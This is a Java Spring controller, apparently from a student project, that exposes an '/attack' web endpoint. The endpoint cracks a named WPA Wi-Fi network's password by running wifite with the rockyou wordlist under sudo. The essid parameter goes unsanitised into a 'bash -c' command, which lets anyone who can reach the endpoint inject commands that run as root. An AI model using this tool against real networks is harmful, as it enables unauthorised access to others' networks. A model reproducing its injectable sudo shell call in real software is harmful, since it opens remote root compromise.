package com.uqac.wifi_attack.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
public class WifiAttackController {

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @GetMapping("/attack")
    public String executeAttack(@RequestParam String essid) {
        String command = String.format("sudo wifite --wpa --essid \"%s\" --dict ~/Documents/rockyou_small.txt --all --timeout 300 && sudo airmon-ng stop wlp110s0f0mon && sudo service NetworkManager start", essid);
        StringBuilder output = new StringBuilder();

        try {
            Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            return output.toString();
        } catch (IOException | InterruptedException e) {
            logger.error("Error executing command", e);
            return "Error executing command: " + e.getMessage();
        }
    }
}